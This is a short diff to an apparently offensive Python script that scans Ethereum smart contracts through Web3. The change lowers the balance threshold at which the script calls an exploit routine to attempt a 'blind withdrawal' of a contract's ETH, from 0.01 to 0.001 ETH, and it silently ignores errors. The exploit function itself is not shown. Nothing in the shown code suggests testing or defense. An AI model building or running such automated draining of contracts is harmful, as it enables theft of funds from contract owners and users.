@@ -570,8 +570,8 @@ def process_contract(w3: Web3, addr: str) -> None:
             if not findings and not ONLY_FOT_MODE:
                 try:
                     balance_wei = w3.eth.get_balance(addr)
-                    if balance_wei > 10**16: # > 0.01 ETH
-                        print(f"[MAXIMUM] Contract {addr} has {balance_wei/10**18:.4f} ETH. Attempting Blind Withdrawal...", flush=True)
+                    if balance_wei > 10**15: # > 0.001 ETH (Lowered threshold)
+                        print(f"[MAXIMUM] Contract {addr} has {balance_wei/10**18:.4f} ETH. Attempting Blind Withdrawal (Lower Threshold)...", flush=True)
                         execute_cautious_exploit(w3, addr, "blind_withdrawal", {"balance_wei": balance_wei})
                 except Exception:
                     pass
